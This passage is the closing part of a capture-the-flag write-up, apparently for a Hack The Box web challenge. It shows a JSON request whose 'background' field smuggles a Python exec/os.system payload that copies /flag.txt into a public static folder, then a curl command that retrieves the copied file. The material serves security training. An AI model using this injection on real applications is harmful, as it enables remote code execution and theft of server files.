rg1WGsg2Rl2eS9gxHp/IFtH06TVeE1Y2wDPrJs8WiCqLyrOGb9YvGcJlPwaC2dL4CfLFu8AW8d16xf1VaJ5zRZBR498r0X+MqyxfsZY6yB+lVtSh6Dn326S5e7LFs8OnHU58qjcx8JyqclVKu+Do6RLFu8r6AwMUzky5iQfGqvgjxZtnjvNTUN9xP5MiYkfxnIlWWF53neikS+jAnIp+fr/gXBsizxerLZ7EznPhzLp5dA7wf5smzxuhsbG8526KPKBQHTyQDWw+CRZYv3VnQbMq4SXguKhR6FyrLFq2mZWU0f8VrMZHTGqeyNHCBflg3eAQjvc7TlI17TSLYI+BRXCm+ZRR/Rm0YyOuHzC/AqrgQevXd4hAUf0ZtmMlqYgVtxpfAet+AjWtNM5kOZt38zKa4EXjeEt8WZ8hGtGUhGy6ZzLa4U3l0GffRpVc8PGEi2GXgXVwJvm0Efva3IU36omawVSk75Mi2uBF4PbnuODfnEUX6omewe4F9cETzf95fbkD9gBzD8M/M2CCiuBJ7neVtsyO+zAxiWT8/IHZFQXCG84x0d7XnT8nvnAKYnGNjhiwUVVwQvl8tOMy2/y9Y9gfg3a6Gk4grhLY3rQ+nXxuzS972Vwoorgbcmrg+lXxuzS5y0bBJWXAm8ml9F29+H0q+N2SXuAFuFFVcCb0dcH0q/Ng4tsPPbLRfjTOTtietD6dfSocWnlotxJvK+ietD6dfKoQXAR1ELAYNLlg2e8k+A6aM5Zash2euqgZeLQSbLBq/iJJCbfGpPVhkMt+JK4D2n4cNMi5BsTg0D4lRcCbz5Gj70W8Rk9MRr1bd2MSquBN54DR96LWayD1UDYlZc7rzPDPiI1zSSza8wGG7FlcC714CP6E0zGd0Q+m3/wTAsLnfeTxAuniXynkB6v27v42AMiyuBN9egj95W5Ck/NJRsFfAtLnfeOgs+nN0TeLrRyhe0xj7D4nLnvYsxxKb8ATuArWT0pg3cCZ7HQvQwKS533gsYOdvy++wALpIFQTATqiwQoQqmskzy6BnKW1z56J0DuEpW4FHShRifRykOQ1kmebRI5hKwONuvyHMsv38bC+HzA6shfAKGVtA8CP3WEGImKy6PxnSoMMaPMdZCeHzfZ8VQ5z4SlJ/yOPBEdz7l6fNEdz7l6fNEdz7l6fNEdz7l6fNEdz7lWeM5TZbyePGcJkt5vHhOk6U8XjynyVIeL57TZCmPD+9/39SX+2FREkkAAAAASUVORK5CYII=","background":["exec(\"import os; os.system('cp /flag.txt /app/application/static/images/flag.txt')\")",255,255]}
```

```bash
~ ❯ curl http://localhost:1337/static/images/flag.txt
HTB{f4k3_fl4g_f0r_t3st1ng}
```

This way we can exfiltrate the contents of flag. Now we can do the exact similar process in the server side to get the flag.

This is all for this challenge. Hope you liked the writeup 🙂